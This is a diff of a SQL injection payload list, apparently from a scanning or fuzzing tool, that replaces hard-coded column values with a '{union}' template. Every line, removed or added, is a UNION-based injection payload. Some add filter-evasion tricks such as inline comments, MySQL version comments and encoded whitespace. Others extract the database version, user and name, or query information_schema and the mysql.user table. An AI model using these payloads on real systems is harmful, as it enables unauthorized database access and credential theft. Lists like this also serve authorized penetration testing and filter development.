@@ -1,40 +1,43 @@
-union/**/select/**/1--
-union/*comment*/select/*comment*/1--
-union/*!50000select*/1--
-union%0Aselect%0A1--
-union%09select%091--
-union%0Dselect%0D1--
-union/**/select/**/1,2,3--
-union/*random*/select/*random*/1,2,3--
-union/*!50000select*/1,2,3--
-union%0Aselect%0A1,2,3--
-union%09select%091,2,3--
-union%0Dselect%0D1,2,3--
-union all select 1--
-union distinct select 1--
+union/**/select/**/{union}--
+union/*comment*/select/*comment*/{union}--
+union/*!50000select*/{union}--
+union%0Aselect%0A{union}--
+union%09select%09{union}--
+union%0Dselect%0D{union}--
+union/**/select/**/{union}--
+union/*random*/select/*random*/{union}--
+union/*!50000select*/{union}--
+union%0Aselect%0A{union}--
+union%09select%09{union}--
+union%0Dselect%0D{union}--
+union all select {union}--
+union distinct select {union}--
 union all select null,null,null--
 union select null,null,null--
-union select 1,@@version,3--
-union select 1,version(),3--
-union select 1,database(),3--
-union select 1,user(),3--
-union select 1,concat(user(),0x3a,database()),3--
-union select 1,concat_ws(0x3a,user(),database()),3--
-union select 1,1,1 where 1=1--
-union select 1,1,1 where 1=0--
-union select 1,1,1 from dual--
-union select 1,1,1 from information_schema.tables--
-union select 1,1,1 from information_schema.columns--
-union select 1,1,1 from mysql.user--
-union select 1,user()--+%23
-union select 1,database()--+%23
-union select 1,version()--+%23
-union select 1,concat(user(),0x3a,database())--+%23
-union select 1,concat_ws(0x3a,user(),database())--+%23
-union select 1,1,1 limit 1--+%23
-union select 1,1,1 limit 1,1--+%23
-union select 1,1,1 order by 1--+%23
-union select 1,1,1 order by 2--+%23
-union select 1,1,1 order by 3--+%23
-union select 1,1,1 order by 4--+%23
-union select 1,1,1 order by 5--+%23
+union select {union}--
+union select {union}--
+union select {union}--
+union select {union}--
+union select {union}--
+union select {union}--
+union select {union}--
+union select {union}--
+union select {union}--
+union select {union} where 1=1--
+union select {union} where 1=0--
+union select {union} from dual--
+union select {union} from information_schema.tables--
+union select {union} from information_schema.columns--
+union select {union} from mysql.user--
+union select {union}--+%23
+union select {union}--+%23
+union select {union}--+%23
+union select {union}--+%23
+union select {union}--+%23
+union select {union} limit 1--+%23
+union select {union} limit 1,1--+%23
+union select {union} order by 1--+%23
+union select {union} order by 2--+%23
+union select {union} order by 3--+%23
+union select {union} order by 4--+%23
+union select {union} order by 5--+%23
